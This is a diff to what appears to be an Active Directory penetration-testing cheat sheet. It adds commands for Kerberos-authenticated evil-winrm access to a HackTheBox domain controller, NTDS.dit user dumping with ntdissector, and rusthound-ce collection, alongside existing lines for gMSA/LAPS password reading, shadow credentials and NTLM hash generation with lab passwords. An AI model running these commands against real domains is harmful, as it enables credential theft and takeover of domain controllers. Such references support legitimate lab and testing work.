@@ -10,7 +10,9 @@ ldap_shell ignite.local/komal:Password@1 -dc-ip 192.168.1.48		# get_laps_gmsa
 Invoke-GMSAPasswordReader -Command "--AccountName MyGMSA"	# https://github.com/ricardojba/Invoke-GMSAPasswordReader
 ldap_shell ignite.local/krishna:Password@1 -dc-ip 192.168.1.58		# get_ntlm <user> # Shadow credentials | msds-KeyCredentialLink | instead pywhisker
 python -c "import hashlib;hash=hashlib.new('md4', '1loggbz'.encode('utf-16le')).digest().hex(); print(hash)"		# generate NTLM hash from clear text password
-
+nxc smb infiltrator.htb --generate-krb5-file infiltrator-krb.conf && sudo cp infiltrator-krb.conf /etc/krb5.conf && KRB5CCNAME=user.ccache evil-winrm -i dc01.infiltrator.htb -r infiltrator.htb	# REALM # Access Winrm kerberos
+ntdissector -ntds NTDS.dit -system SYSTEM -outputdir /tmp/ntdissector/ -ts -f all	# Dump user objects and include deleted records
+rusthound-ce -d DOMAIN.LOCAL -u USERNAME@DOMAIN.LOCAL -z	# bllodhound-ce |  collect domain objects and obtain the zip archive | ADCS included
 
 # RUBEUS
 
